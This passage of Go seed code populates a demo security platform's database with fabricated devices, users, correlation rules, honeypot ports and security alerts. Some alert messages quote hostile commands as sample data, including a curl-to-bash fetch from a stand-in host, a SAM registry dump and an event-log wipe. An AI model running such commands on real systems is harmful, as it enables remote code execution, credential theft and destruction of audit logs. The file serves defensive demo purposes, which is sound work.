		agentID := agentIDs[c.agentIdx%len(agentIDs)]
		var incidentID *int
		if i < len(incidentIDs) {
			incidentID = &incidentIDs[i]
		}
		var collID int
		err := db.QueryRow(`
			INSERT INTO forensic_collections
				(tenant_id, incident_id, agent_id, label, status, artifact_types, triggered_by, started_at, completed_at, created_at)
			VALUES (9999,$1,$2,$3,$4,$5::text[],$6,$7,$8,$9)
			RETURNING id`,
			incidentID, agentID, c.label, c.status, "{"+c.artifactTypes+"}",
			c.triggeredBy,
			now.Add(-time.Duration(c.hoursAgo)*time.Hour),
			now.Add(-time.Duration(c.hoursAgo-1)*time.Hour),
			now.Add(-time.Duration(c.hoursAgo)*time.Hour),
		).Scan(&collID)
		if err != nil {
			log.Printf("dfir collection: %v", err)
			continue
		}
		artifacts := []struct {
			artifactType string
			itemCount    int
			data         string
		}{
			{"processes", 48, `[{"pid":6001,"name":"python3","cmdline":"/tmp/.hidden/c2client.py","suspicious":true}]`},
			{"network", 12, `[{"remote_ip":"185.220.101.47","port":443,"state":"ESTABLISHED","pid":6001}]`},
			{"files", 3, `[{"path":"/tmp/.hidden/beacon","hash":"275a021b","size":52480}]`},
		}
		for _, a := range artifacts {
			mustExec(db, `
				INSERT INTO forensic_artifacts
					(collection_id, tenant_id, agent_id, artifact_type, data, item_count, collected_at)
				VALUES ($1,9999,$2,$3,$4::jsonb,$5,$6)`,
				collID, agentID, a.artifactType, a.data, a.itemCount,
				now.Add(-time.Duration(c.hoursAgo-1)*time.Hour),
			)
		}
	}
}

func seedMDM(db *sql.DB, agentIDs []int) {
	devices := []struct {
		agentIdx     int
		udid         string
		serial       string
		deviceName   string
		model        string
		platform     string
		osVersion    string
		ownerEmail   string
		isEncrypted  bool
		isJailbroken bool
		compliance   string
	}{
		{3, "demo-android-udid-001", "R28M102ABCD", "asmith-pixel7", "Pixel 7 Pro", "android", "14.0", "asmith@democorp.com", true, false, "compliant"},
		{-1, "demo-android-udid-002", "R29M203EFGH", "jdoe-galaxy-s24", "Samsung Galaxy S24", "android", "14.0", "jdoe@democorp.com", true, false, "non_compliant"},
		{-1, "demo-ios-udid-003", "IPAD-DEMO-003", "exec-ipad-pro", "iPad Pro 12.9", "ios", "17.5.1", "ceo@democorp.com", true, false, "compliant"},
	}
	for _, d := range devices {
		var agentID *int
		if d.agentIdx >= 0 && d.agentIdx < len(agentIDs) {
			id := agentIDs[d.agentIdx]
			agentID = &id
		}
		var deviceID int
		err := db.QueryRow(`
			INSERT INTO mdm_devices
				(tenant_id, agent_id, udid, serial_number, device_name, model, platform, os_version, owner_email,
				 is_encrypted, has_passcode, passcode_compliant, is_jailbroken, compliance_status, status, last_check_in)
			VALUES (9999,$1,$2,$3,$4,$5,$6,$7,$8,$9,true,true,$10,$11,'enrolled',now()-interval '5 minutes')
			ON CONFLICT (udid) DO NOTHING
			RETURNING id`,
			agentID, d.udid, d.serial, d.deviceName, d.model, d.platform, d.osVersion, d.ownerEmail,
			d.isEncrypted, d.isJailbroken, d.compliance,
		).Scan(&deviceID)
		if err != nil {
			continue
		}
		apps := []struct {
			pkg, name, version string
		}{
			{"com.google.android.gm", "Gmail", "2026.03.01"},
			{"com.slack.android", "Slack", "24.03.10"},
			{"com.microsoft.teams", "Microsoft Teams", "1456.2460"},
		}
		for _, a := range apps {
			mustExec(db, `
				INSERT INTO mdm_device_apps (device_id, tenant_id, package_name, app_name, version)
				VALUES ($1,9999,$2,$3,$4)`,
				deviceID, a.pkg, a.name, a.version,
			)
		}
	}
}

func seedIdentity(db *sql.DB) {
	users := []struct {
		username, displayName, email, dept, title, manager, status string
		groups                                                      string
	}{
		{"admin", "System Administrator", "admin@democorp.com", "IT Security", "Security Admin", "CISO", "active", `{"Domain Admins","Security"}` },
		{"jdoe", "John Doe", "jdoe@democorp.com", "Engineering", "Senior Engineer", "alice.m", "active", `{"Engineering","VPN Users"}`},
		{"asmith", "Alice Smith", "asmith@democorp.com", "Sales", "Account Executive", "vp.sales", "active", `{"Sales","Remote Users"}`},
		{"svc_backdoor", "Service Account (Backdoor)", "", "IT", "Service Account", "", "suspicious", `{"Domain Users"}`},
		{"bwilson", "Bob Wilson", "bwilson@democorp.com", "Finance", "Finance Manager", "cfo", "active", `{"Finance","Accounting"}`},
	}
	for _, u := range users {
		mustExec(db, `
			INSERT INTO identity_cache
				(tenant_id, username, display_name, email, department, title, manager, groups, account_status, last_logon)
			VALUES (9999,$1,$2,$3,$4,$5,$6,$7::text[],$8,now()-interval '1 hour')
			ON CONFLICT DO NOTHING`,
			u.username, u.displayName, u.email, u.dept, u.title, u.manager,
			"{"+u.groups+"}", u.status,
		)
	}
}

func seedCorrelation(db *sql.DB) {
	rules := []struct {
		name, desc, severity, ruleName, technique, action, corrType, condValue string
		windowMins, threshold                                                    int
	}{
		{"C2 + Lateral Movement Chain", "Correlates C2 beacon with subsequent lateral movement within 60 minutes", "critical", "C2 Beacon Detected", "T1071.001", "create_incident", "temporal", "lateral_movement", 60, 2},
		{"Credential Dump → Privilege Escalation", "Links credential dump with privilege escalation from same host", "critical", "Credential Dump — LSASS", "T1003.001", "escalate", "causal", "privilege_escalation", 30, 1},
		{"Brute Force → Successful Login", "Detects successful login following 20+ failures from same IP", "high", "SSH Brute Force", "T1110.001", "block_ip", "threshold", "success", 10, 20},
		{"Multiple Persistence Mechanisms", "Alerts when 3+ persistence techniques detected on same host in 24h", "high", "Suspicious Cron Job", "T1053", "notify", "threshold", "", 1440, 3},
	}
	for _, r := range rules {
		mustExec(db, `
			INSERT INTO correlation_rules
				(name, description, severity, rule_name, mitre_technique, action, correlation_type, condition_value, window_minutes, threshold, enabled, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,true,9999)
			ON CONFLICT DO NOTHING`,
			r.name, r.desc, r.severity, r.ruleName, r.technique, r.action, r.corrType, r.condValue, r.windowMins, r.threshold,
		)
	}
}

func seedHoneyports(db *sql.DB, agentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	ports := []struct {
		agentIdx    int
		port        int
		proto       string
		desc        string
		severity    string
	}{
		{0, 4444, "tcp", "Meterpreter listener honeypot — any connection is a threat signal", "critical"},
		{0, 1433, "tcp", "Fake MSSQL honeypot — detects lateral SQL connection attempts", "high"},
		{1, 27017, "tcp", "Fake MongoDB honeypot — external DB access attempts", "high"},
		{2, 5985, "tcp", "WinRM honeypot — detects remote management lateral movement", "medium"},
	}
	for _, p := range ports {
		agentID := agentIDs[p.agentIdx%len(agentIDs)]
		mustExec(db, `
			INSERT INTO honeyports
				(tenant_id, agent_id, port, protocol, description, alert_severity, is_active)
			VALUES (9999,$1,$2,$3,$4,$5,true)
			ON CONFLICT DO NOTHING`,
			agentID, p.port, p.proto, p.desc, p.severity,
		)
	}
}

func seedEndpointUsers(db *sql.DB, agentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	now := time.Now()
	users := []struct {
		agentIdx int
		username string
		uid      int
		shell    string
	}{
		{0, "root", 0, "/bin/bash"},
		{0, "www-data", 33, "/usr/sbin/nologin"},
		{0, "svc_backdoor", 1001, "/bin/bash"},
		{1, "root", 0, "/bin/bash"},
		{1, "mysql", 999, "/bin/false"},
		{1, "www-data", 33, "/usr/sbin/nologin"},
		{2, "Administrator", 500, "cmd.exe"},
		{2, "SYSTEM", 18, ""},
		{2, "jdoe", 1001, "powershell.exe"},
	}
	for _, u := range users {
		agentID := agentIDs[u.agentIdx%len(agentIDs)]
		mustExec(db, `
			INSERT INTO endpoint_users
				(agent_id, username, uid, shell, collected_at, tenant_id)
			VALUES ($1,$2,$3,$4,$5,9999)`,
			agentID, u.username, u.uid, u.shell, now,
		)
	}
}

func seedSOARExecutions(db *sql.DB, agentIDs []int, playbookIDs []int) {
	if len(playbookIDs) == 0 || len(agentIDs) == 0 {
		return
	}
	now := time.Now()
	type exec struct {
		pbIdx      int
		agentIdx   int
		actionType string
		alertRule  string
		status     string
		overall    string
		stepsTotal int
		stepsOK    int
		stepsFail  int
		durationMs int
		minsAgo    int
	}
	execs := []exec{
		{0, 0, "isolate_agent", "Ransomware: Mass File Encryption Detected", "completed", "completed", 4, 4, 0, 2340, 480},
		{2, 1, "block_ip", "Brute Force: SSH Login Failures > 50", "completed", "completed", 3, 3, 0, 890, 360},
		{3, 2, "create_case", "Incident Escalation: C2 Beacon Confirmed", "completed", "completed", 5, 5, 0, 1200, 300},
		{1, 0, "notify_slack", "Critical: Cobalt Strike Implant Detected", "completed", "completed", 2, 2, 0, 450, 240},
		{0, 1, "isolate_agent", "Ransomware: Encrypted File Extension Detected", "completed", "completed", 4, 3, 1, 3100, 180},
		{2, 2, "block_ip", "Network Scan: Port Sweep from Internal Host", "completed", "completed", 3, 3, 0, 670, 120},
		{1, 0, "notify_slack", "Critical: LSASS Credential Dump", "completed", "completed", 2, 2, 0, 320, 90},
		{3, 1, "create_case", "Incident Escalation: Lateral Movement Chain", "completed", "completed", 5, 4, 0, 1450, 60},
	}
	for _, e := range execs {
		pbID := playbookIDs[e.pbIdx%len(playbookIDs)]
		agentID := agentIDs[e.agentIdx%len(agentIDs)]
		mustExec(db, `
			INSERT INTO playbook_executions
				(playbook_id, agent_id, alert_rule, action_type, status, overall_status,
				 steps_total, steps_ok, steps_failed, duration_ms, created_at, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,9999)`,
			pbID, agentID, e.alertRule, e.actionType, e.status, e.overall,
			e.stepsTotal, e.stepsOK, e.stepsFail, e.durationMs,
			now.Add(-time.Duration(e.minsAgo)*time.Minute),
		)
	}
}

func seedCloudInfraAlerts(db *sql.DB, agentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	now := time.Now()
	type alert struct {
		agentIdx  int
		severity  string
		rule      string
		message   string
		tactic    string
		technique string
		mitreName string
		minsAgo   int
	}
	alerts := []alert{
		// Cloud Security — AWS/Azure/GCP
		{0, "critical", "AWS S3 Bucket Made Public", "S3 bucket prod-backups-us-east-1 ACL changed to public-read by IAM user ci-deploy. 847 objects now publicly accessible.", "Exfiltration", "T1530", "Data from Cloud Storage", 55},
		{0, "high", "AWS IAM Privilege Escalation", "User staging-ci attached AdministratorAccess policy to itself via iam:AttachUserPolicy. Account: 123456789012.", "Privilege Escalation", "T1078.004", "Cloud Accounts", 130},
		{1, "critical", "Azure AD Global Admin Granted", "Global Administrator role assigned to external guest user attacker@evil.com by admin@corp.com.", "Persistence", "T1098.003", "Additional Cloud Credentials", 210},
		{1, "high", "Azure Login from Impossible Travel", "User jdoe@corp.com authenticated from London (prev. NYC, 8 min gap). IP: 185.220.101.12.", "Credential Access", "T1110", "Brute Force", 320},
		{2, "high", "GCP Service Account Key Created", "Service account compute-engine@project.iam.gserviceaccount.com had new JSON key (ID: 1a2b3c) created by admin user outside business hours.", "Persistence", "T1098.001", "Additional Cloud Credentials", 410},
		{2, "medium", "GCP Cloud Run Deployed from Untrusted Source", "Cloud Run service data-processor deployed from unverified container image gcr.io/third-party/scraper:latest.", "Execution", "T1610", "Deploy Container", 520},
		// Email Security
		{0, "critical", "Phishing: CEO Impersonation BEC", "Email from ceo@corp-secure.com (lookalike) requesting $85,000 wire transfer. Sent to finance@corp.com. SPF/DKIM fail.", "Initial Access", "T1566.001", "Spearphishing Attachment", 75},
		{0, "high", "Credential Phishing: Fake O365 Login", "Email with credential phishing link to http://login.microsoftonline.com.malicious.ru/index.html sent to 23 users.", "Credential Access", "T1598.002", "Spearphishing Link", 160},
		{1, "high", "BEC: Financial Request Pattern Matched", "Email thread detected with BEC financial trigger keywords: 'wire transfer', 'urgent', 'today only'. From: billing@vendor-legit.com.", "Collection", "T1114", "Email Collection", 270},
		{1, "medium", "Lookalike Domain: corp0.com Detected", "Inbound email from admin@corp0.com (edit-distance 1 from corp.com). Possible typosquatting attack.", "Initial Access", "T1566", "Phishing", 380},
		{2, "high", "Mass Outbound Email: Data Exfil Risk", "User svc_backdoor@corp.com sent 312 emails in 10 minutes to external addresses. Attachment: db_export.zip.", "Exfiltration", "T1048.003", "Exfiltration Over Unencrypted Protocol", 490},
		// Container Security
		{0, "critical", "Privileged Container Escape Attempt", "Container xcloak-api running with --privileged flag attempted host filesystem mount via nsenter. Falco rule triggered.", "Privilege Escalation", "T1611", "Escape to Host", 85},
		{1, "critical", "Cryptomining: xmrig Detected in Container", "Process xmrig found in container worker-8 connecting to pool.minexmr.com:4444 (stratum+tcp). CPU 99%.", "Impact", "T1496", "Resource Hijacking", 195},
		{0, "high", "Kubernetes ClusterRole Binding Escalation", "ServiceAccount default:backend granted cluster-admin via ClusterRoleBinding created by unknown kubectl session.", "Privilege Escalation", "T1078.001", "Default Accounts", 275},
		{1, "high", "Docker Socket Exposed in Container", "Container data-processor mounted /var/run/docker.sock. Allows full Docker daemon control and container escape.", "Defense Evasion", "T1610", "Deploy Container", 365},
		// AD Attacks
		{2, "critical", "Kerberoasting: 14 SPNs Targeted", "Host win-attacker requested Kerberos TGS tickets for 14 service accounts in 90s. Classic Kerberoasting pattern.", "Credential Access", "T1558.003", "Kerberoasting", 95},
		{2, "critical", "DCSync: Credential Dump via AD Replication", "Host win-workstation-05 called DRSGetNCChanges against dc-01. Non-DC machine replicating AD — DCSync attack.", "Credential Access", "T1003.006", "DCSync", 165},
		{0, "high", "AS-REP Roasting: Pre-Auth Disabled Users", "3 accounts with Kerberos pre-auth disabled targeted: svc_sql, svc_backup, svc_print. TGTs captured by attacker.", "Credential Access", "T1558.004", "AS-REP Roasting", 245},
		{1, "high", "BloodHound: AD Enumeration Detected", "SharpHound collector running on win-workstation-08. LDAP queries matching BloodHound session enumeration pattern.", "Discovery", "T1018", "Remote System Discovery", 340},
		{2, "high", "Pass-the-Hash: NTLM Lateral Movement", "Source win-workstation-05 authenticated to dc-01 and file-srv-02 using NTLM hash (no password). PTH attack confirmed.", "Lateral Movement", "T1550.002", "Pass the Hash", 420},
		// Supply Chain
		{0, "critical", "Curl-to-Shell: Remote Installer Detected", "Process: curl https://evil.sh | bash run as root in CI pipeline stage build-prod. Confirmed RCE via supply chain.", "Execution", "T1059.004", "Unix Shell", 105},
		{1, "high", "Dependency Confusion: Internal Package Hijack", "npm install pulled @corp/auth-utils 3.1.0 from public registry instead of private Artifactory. Typo in package.json.", "Initial Access", "T1195.001", "Compromise Software Dependencies", 200},
		{0, "high", "Typosquatting: reqeusts Package Installed", "pip install reqeusts (typo of requests) detected in dev-build pipeline. Package contains credential harvester.", "Initial Access", "T1195.001", "Compromise Software Dependencies", 290},
		{2, "medium", "Build Injection: Makefile Modified", "Makefile in repo auth-service was modified to run compile in stage with extra curl download before compilation step.", "Execution", "T1059.004", "Unix Shell", 400},
		// OT/ICS
		{0, "critical", "ICS Port Scan: Modbus/TCP Sweep", "Host 192.168.50.12 scanned all OT VLAN hosts on ports 502 (Modbus), 102 (S7comm), 44818 (EtherNet/IP). ICS enumeration.", "Discovery", "T1046", "Network Service Discovery", 115},
		{1, "critical", "PLC Programming Mode Activated", "Engineering workstation EWS-01 sent Siemens S7comm Stop+Program mode command to PLC at 192.168.100.5. Unauthorized.", "Inhibit Response Function", "T0858", "Change Operating Mode", 220},
		{0, "high", "Historian Access from IT Network", "SCADA historian server HIST-01 accessed from IT subnet 10.0.0.0/8 via OPC-UA protocol. IT→OT bridging detected.", "Collection", "T0802", "Automated Collection", 330},
		{2, "high", "Safety System Bypass Attempt", "Write command to Safety Instrumented System (SIS) controller blocked by safety PLC. Source: OT-workstation-03.", "Manipulation", "T0858", "Change Operating Mode", 450},
		// Process Injection
		{2, "critical", "LSASS Memory Dump via MiniDump", "Process mimikatz.exe (renamed as svchost.exe) opened LSASS with MiniDumpWriteDump. Credential harvest confirmed.", "Credential Access", "T1003.001", "LSASS Memory", 125},
		{2, "critical", "CreateRemoteThread: Process Injection Detected", "explorer.exe spawned remote thread into lsass.exe via CreateRemoteThread API. Reflective DLL injection pattern.", "Defense Evasion", "T1055.001", "Dynamic-link Library Injection", 215},
		{0, "high", "Process Hollowing: svchost Replacement", "Legitimate svchost.exe process hollowed and replaced with malicious payload. Memory region marked RWX.", "Defense Evasion", "T1055.012", "Process Hollowing", 310},
		{1, "high", "SAM Credential Dump via Registry", "reg save HKLM\\SAM C:\\Users\\Public\\sam.bak executed by user jdoe. SAM credential database exported.", "Credential Access", "T1003.002", "Security Account Manager", 410},
		{0, "medium", "Reflective DLL Injection: Unsigned DLL Loaded", "Process powershell.exe loaded unsigned dll from temp path C:\\Users\\Public\\helper.dll via reflective injection.", "Defense Evasion", "T1055.001", "Dynamic-link Library Injection", 490},
		// Defense Evasion
		{2, "critical", "Event Log Cleared: Security Log Wiped", "Windows Security event log cleared by SYSTEM account on dc-01. 14,823 events destroyed. wevtutil cl Security.", "Defense Evasion", "T1070.001", "Clear Windows Event Logs", 135},
		{0, "high", "AMSI Bypass: AmsiScanBuffer Patch", "PowerShell process patched AmsiScanBuffer in memory via reflection. AMSI evasion before malware execution.", "Defense Evasion", "T1562.001", "Disable or Modify Tools", 230},
		{1, "high", "UAC Bypass: Event Viewer Hijack", "cmd.exe spawned with High integrity via eventvwr.exe HKCU registry hijack. UAC bypass without prompt.", "Privilege Escalation", "T1548.002", "Bypass User Account Control", 320},
		{2, "high", "Windows Defender Disabled via Registry", "Registry key HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware set to 1 by svc_backdoor.", "Defense Evasion", "T1562.001", "Disable or Modify Tools", 420},
		{0, "medium", "ETW Patch: Audit Policy Disabled", "EtwEventWrite function NOP-patched in ntdll.dll by process inject-tool.exe. Event Tracing for Windows disabled.", "Defense Evasion", "T1562.006", "Disable or Modify Linux Audit System", 520},
	}

	for i, a := range alerts {
		agentID := agentIDs[a.agentIdx%len(agentIDs)]
		fingerprint := fmt.Sprintf("cloud-infra-%d-%d", i, a.minsAgo)
		mustExec(db, `
			INSERT INTO alerts
				(agent_id, severity, rule_name, log_message, created_at,
				 mitre_tactic, mitre_technique, mitre_name, status, fingerprint, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,'open',$9,9999)`,
			agentID, a.severity, a.rule, a.message,
			now.Add(-time.Duration(a.minsAgo)*time.Minute),
			a.tactic, a.technique, a.mitreName, fingerprint,
		)
	}
}

func seedFirewallEnterprise(db *sql.DB) {
	const tid = 9999
	now := time.Now()

	// ── tables ──────────────────────────────────────────────────────────────
	mustExec(db, `CREATE TABLE IF NOT EXISTS fwe_policies (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, policy_id TEXT NOT NULL UNIQUE,
		name TEXT NOT NULL, description TEXT, status TEXT NOT NULL DEFAULT 'active',
		priority INTEGER NOT NULL DEFAULT 100, rule_count INTEGER DEFAULT 0,
		owner TEXT, tags JSONB DEFAULT '[]', version INTEGER DEFAULT 1,
		created_at TIMESTAMP DEFAULT NOW(), updated_at TIMESTAMP DEFAULT NOW()
	)`)
	mustExec(db, `CREATE TABLE IF NOT EXISTS fwe_zones (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, zone_id TEXT NOT NULL UNIQUE,
		name TEXT NOT NULL, zone_type TEXT NOT NULL DEFAULT 'custom',
		description TEXT, cidr_ranges JSONB DEFAULT '[]', trust_level TEXT DEFAULT 'medium',
		interface_names JSONB DEFAULT '[]', enabled BOOLEAN DEFAULT TRUE,
		created_at TIMESTAMP DEFAULT NOW(), updated_at TIMESTAMP DEFAULT NOW()
	)`)
	mustExec(db, `CREATE TABLE IF NOT EXISTS fwe_nat (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, nat_id TEXT NOT NULL UNIQUE,
		name TEXT NOT NULL, nat_type TEXT NOT NULL DEFAULT 'snat',
		src_ip TEXT, dst_ip TEXT, translated_ip TEXT,
		src_port TEXT, dst_port TEXT, translated_port TEXT,
		protocol TEXT DEFAULT 'tcp', interface TEXT,
		hit_count BIGINT DEFAULT 0, enabled BOOLEAN DEFAULT TRUE,
		created_at TIMESTAMP DEFAULT NOW(), updated_at TIMESTAMP DEFAULT NOW()
	)`)
	mustExec(db, `CREATE TABLE IF NOT EXISTS fwe_threats (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, threat_id TEXT NOT NULL UNIQUE,
		threat_type TEXT NOT NULL, src_ip TEXT, dst_ip TEXT,
		src_port INTEGER, dst_port INTEGER, protocol TEXT DEFAULT 'tcp',
		country TEXT, asn TEXT, action_taken TEXT DEFAULT 'blocked',
		severity TEXT DEFAULT 'medium', confidence INTEGER DEFAULT 80,
		rule_triggered TEXT, payload_sample TEXT, geo_lat FLOAT, geo_lon FLOAT,
		created_at TIMESTAMP DEFAULT NOW()
	)`)
	mustExec(db, `CREATE TABLE IF NOT EXISTS fwe_connections (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, conn_id TEXT NOT NULL UNIQUE,
		src_ip TEXT NOT NULL, src_port INTEGER NOT NULL,
		dst_ip TEXT NOT NULL, dst_port INTEGER NOT NULL,
		protocol TEXT DEFAULT 'tcp', application TEXT,
		state TEXT DEFAULT 'established',
		bytes_sent BIGINT DEFAULT 0, bytes_recv BIGINT DEFAULT 0,
		packets_sent BIGINT DEFAULT 0, packets_recv BIGINT DEFAULT 0,
		duration INTEGER DEFAULT 0,
		zone_src TEXT, zone_dst TEXT, rule_id TEXT,
		started_at TIMESTAMP DEFAULT NOW(), updated_at TIMESTAMP DEFAULT NOW()
	)`)
	mustExec(db, `CREATE TABLE IF NOT EXISTS fwe_approvals (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, approval_id TEXT NOT NULL UNIQUE,
		change_type TEXT NOT NULL, description TEXT NOT NULL,
		requester TEXT NOT NULL, approver TEXT,
		status TEXT NOT NULL DEFAULT 'pending',
		priority TEXT NOT NULL DEFAULT 'high',
		policy TEXT, decision_note TEXT,
		decided_at TIMESTAMP, expires_at TIMESTAMP,
		created_at TIMESTAMP DEFAULT NOW(), updated_at TIMESTAMP DEFAULT NOW()
	)`)
	mustExec(db, `CREATE TABLE IF NOT EXISTS fwe_notifications (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
		event_type TEXT NOT NULL, title TEXT NOT NULL, message TEXT NOT NULL,
		severity TEXT NOT NULL DEFAULT 'info',
		rule_id TEXT, src_ip TEXT, read BOOLEAN DEFAULT FALSE,
		created_at TIMESTAMP DEFAULT NOW()
	)`)
	mustExec(db, `CREATE TABLE IF NOT EXISTS fwe_audit (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
		action TEXT NOT NULL, object_type TEXT NOT NULL,
		object_id TEXT, object_name TEXT, actor TEXT NOT NULL,
		details TEXT, ip_address TEXT,
		created_at TIMESTAMP DEFAULT NOW()
	)`)
	mustExec(db, `CREATE TABLE IF NOT EXISTS fwe_blocked (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
		block_type TEXT NOT NULL DEFAULT 'ip',
		value TEXT NOT NULL, reason TEXT,
		blocked_by TEXT NOT NULL DEFAULT 'system',
		expires_at TIMESTAMP,
		created_at TIMESTAMP DEFAULT NOW(),
		UNIQUE(tenant_id, block_type, value)
	)`)

	// ── policies ────────────────────────────────────────────────────────────
	type fwePolicy struct {
		id, name, desc, status, owner, tags string
		priority, version, rules            int
	}
	policies := []fwePolicy{
		{"POL-001", "Internet Perimeter Policy", "Controls all inbound and outbound internet traffic", "active", "network-team@corp.com", `["perimeter","internet","critical"]`, 10, 3, 42},
		{"POL-002", "Internal LAN Policy", "Manages east-west traffic between internal segments", "active", "network-ops@corp.com", `["internal","lan"]`, 20, 2, 31},
		{"POL-003", "DMZ Policy", "Governs traffic to and from the demilitarized zone", "active", "security@corp.com", `["dmz","web-facing"]`, 30, 2, 18},
		{"POL-004", "VPN Remote Access Policy", "Rules for remote VPN users", "active", "it-admin@corp.com", `["vpn","remote-access"]`, 40, 1, 12},
		{"POL-005", "Guest Network Policy", "Isolated guest Wi-Fi network rules", "active", "it-admin@corp.com", `["guest","isolated"]`, 50, 1, 8},
		{"POL-006", "Server Farm Policy", "Strict controls for production server segment", "active", "devops@corp.com", `["server","production","strict"]`, 15, 4, 55},
	}
	for _, p := range policies {
		mustExec(db, `INSERT INTO fwe_policies (tenant_id, policy_id, name, description, status, priority, rule_count, owner, tags, version, created_at, updated_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9::jsonb,$10,$11,$12) ON CONFLICT DO NOTHING`,
			tid, p.id, p.name, p.desc, p.status, p.priority, p.rules, p.owner, p.tags, p.version,
			now.Add(-time.Duration(30+len(p.id))*24*time.Hour),
			now.Add(-time.Duration(len(p.id))*time.Hour),
		)
	}

	// ── zones ───────────────────────────────────────────────────────────────
	type fweZone struct{ id, name, ztype, desc, cidrs, trust string }
	zones := []fweZone{
		{"ZONE-WAN", "WAN Zone", "wan", "Public internet-facing interface", `["0.0.0.0/0"]`, "untrusted"},
		{"ZONE-LAN", "Internal LAN", "lan", "Corporate internal network", `["10.0.0.0/8","172.16.0.0/12"]`, "high"},
		{"ZONE-DMZ", "DMZ", "dmz", "Public-facing server segment", `["192.168.100.0/24"]`, "low"},
		{"ZONE-VPN", "VPN Tunnel Zone", "vpn", "Remote access VPN users", `["10.200.0.0/16"]`, "medium"},
		{"ZONE-GUEST", "Guest Network", "guest", "Isolated guest Wi-Fi", `["192.168.200.0/24"]`, "untrusted"},
		{"ZONE-SRV", "Server Farm", "server", "Production server segment", `["10.10.0.0/16"]`, "high"},
		{"ZONE-CLOUD", "Cloud Egress", "cloud", "AWS/Azure VPC peering", `["172.31.0.0/16"]`, "medium"},
	}
	for _, z := range zones {
		mustExec(db, `INSERT INTO fwe_zones (tenant_id, name, zone_type, description, cidr_ranges, trust_level)
			VALUES ($1,$2,$3,$4,$5::jsonb,$6) ON CONFLICT DO NOTHING`,
			tid, z.name, z.ztype, z.desc, z.cidrs, z.trust,
		)
	}

	// ── NAT rules ───────────────────────────────────────────────────────────
	type fweNAT struct {
		id, name, ntype, srcip, dstip, tIP  string
		srcP, dstP, tP, proto, iface        string
		hits                                int64
	}
	natRules := []fweNAT{
		{"NAT-001", "Outbound Internet SNAT", "snat", "10.0.0.0/8", "", "203.0.113.1", "", "", "", "any", "eth0", 4823941},
		{"NAT-002", "Web Server DNAT HTTP", "dnat", "", "203.0.113.1", "192.168.100.10", "", "80", "80", "tcp", "eth0", 128430},
		{"NAT-003", "Web Server DNAT HTTPS", "dnat", "", "203.0.113.1", "192.168.100.10", "", "443", "443", "tcp", "eth0", 384219},
		{"NAT-004", "Mail Server Port Forward", "port_forwarding", "", "203.0.113.1", "10.10.5.20", "", "25", "25", "tcp", "eth0", 9823},
		{"NAT-005", "VPN Static NAT", "static_nat", "10.200.0.100", "", "192.168.50.100", "", "", "", "any", "tun0", 2341},
		{"NAT-006", "Dev Server SSH Forward", "port_forwarding", "", "203.0.113.1", "10.10.20.5", "", "2222", "22", "tcp", "eth0", 156},
		{"NAT-007", "Guest Internet SNAT", "snat", "192.168.200.0/24", "", "203.0.113.2", "", "", "", "any", "eth1", 83210},
		{"NAT-008", "Cloud VPC Dynamic NAT", "dynamic_nat", "172.31.0.0/16", "", "10.0.0.0/8", "", "", "", "any", "vpc0", 5123},
	}
	for _, n := range natRules {
		mustExec(db, `INSERT INTO fwe_nat (tenant_id, nat_id, name, nat_type, src_ip, dst_ip, translated_ip, src_port, dst_port, translated_port, protocol, interface, hit_count)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13) ON CONFLICT DO NOTHING`,
			tid, n.id, n.name, n.ntype, n.srcip, n.dstip, n.tIP,
			n.srcP, n.dstP, n.tP, n.proto, n.iface, n.hits,
		)
	}

	// ── threat events ────────────────────────────────────────────────────────
	type fweThreat struct {
		id, ttype, srcIP, dstIP, country, rule, action, sev string
		srcP, dstP, conf, minsAgo                           int
	}
	threatRows := []fweThreat{
		{"THR-001", "port_scan", "45.33.32.156", "10.0.1.1", "US", "RULE-PS-001", "blocked", "high", 54321, 22, 95, 5},
		{"THR-002", "brute_force", "91.108.4.200", "10.10.5.10", "RU", "RULE-BF-001", "blocked", "critical", 0, 22, 98, 12},
		{"THR-003", "brute_force", "91.108.4.201", "10.10.5.10", "RU", "RULE-BF-001", "blocked", "critical", 0, 3389, 98, 15},
		{"THR-004", "c2_traffic", "185.220.101.47", "10.5.3.22", "DE", "RULE-C2-001", "blocked", "critical", 443, 54321, 92, 2},
		{"THR-005", "ddos", "203.0.113.200", "203.0.113.1", "CN", "RULE-DDOS-001", "blocked", "critical", 0, 80, 99, 1},
		{"THR-006", "malicious_ip", "198.51.100.55", "10.0.0.1", "CN", "RULE-TI-001", "blocked", "high", 0, 443, 87, 30},
		{"THR-007", "port_scan", "203.0.113.99", "10.0.0.1", "BR", "RULE-PS-001", "blocked", "medium", 0, 0, 75, 120},
		{"THR-008", "exploit", "45.155.205.233", "192.168.100.10", "UA", "RULE-EX-001", "blocked", "critical", 45123, 80, 96, 8},
		{"THR-009", "malicious_domain", "10.5.1.50", "10.5.1.100", "—", "RULE-DNS-001", "blocked", "high", 53, 53, 88, 45},
		{"THR-010", "threat_intel", "5.188.206.26", "10.10.1.50", "RU", "RULE-TI-002", "blocked", "high", 0, 8080, 91, 60},
		{"THR-011", "brute_force", "103.21.244.0", "10.10.5.15", "CN", "RULE-BF-002", "blocked", "high", 0, 5900, 85, 90},
		{"THR-012", "port_scan", "77.83.142.33", "192.168.100.1", "NL", "RULE-PS-002", "blocked", "medium", 43210, 0, 72, 240},
	}
	for _, t := range threatRows {
